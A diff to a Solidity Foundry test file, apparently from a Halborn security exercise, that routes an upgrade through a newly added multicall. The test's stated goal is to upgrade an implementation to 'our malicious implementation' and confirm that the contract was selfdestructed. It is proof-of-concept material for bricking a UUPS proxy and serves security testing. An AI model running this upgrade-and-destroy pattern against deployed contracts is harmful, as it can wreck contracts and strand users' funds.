@@ -6,6 +6,8 @@ import "openzeppelin-contracts/contracts/proxy/ERC1967/ERC1967Proxy.sol";
 import {Initializable} from "openzeppelin-contracts-upgradeable/contracts/proxy/utils/Initializable.sol";
 import {UUPSUpgradeable} from "openzeppelin-contracts-upgradeable/contracts/proxy/utils/UUPSUpgradeable.sol";
 import {OwnableUpgradeable} from "openzeppelin-contracts-upgradeable/contracts/access/OwnableUpgradeable.sol";
+import {MulticallUpgradeable} from "../src/libraries/Multicall.sol";
+
 import "openzeppelin-contracts-upgradeable/contracts/utils/StorageSlotUpgradeable.sol";
 
 import {HalbornNFT} from "../src/HalbornNFT.sol";
@@ -19,12 +21,14 @@ contract HalbornBrickProtocol {
 contract HalbornFixedNFT is     
     Initializable,
     UUPSUpgradeable,
-    OwnableUpgradeable
+    OwnableUpgradeable,
+    MulticallUpgradeable
 {
     // ... simplified for demo
     function initialize() external initializer {
         __UUPSUpgradeable_init();
         __Ownable_init();
+        __Multicall_init();
     }
 
     function _authorizeUpgrade(address) internal override onlyOwner {}
@@ -57,7 +61,12 @@ contract HalbornTestBrickProtocol is Test {
 
         // upgrade to our malicious implementation
         HalbornBrickProtocol newImpl = new HalbornBrickProtocol();
-        impl.upgradeTo(address(newImpl));
+
+        bytes[] memory calls = new bytes[](1);
+        bytes memory call1 = abi.encodeWithSignature("upgradeTo(address)", address(newImpl));
+        calls[0] = call1;
+
+        impl.multicall(calls);
 
         // confirm that the implementation contract has been selfdestructed
         // by checking its code size
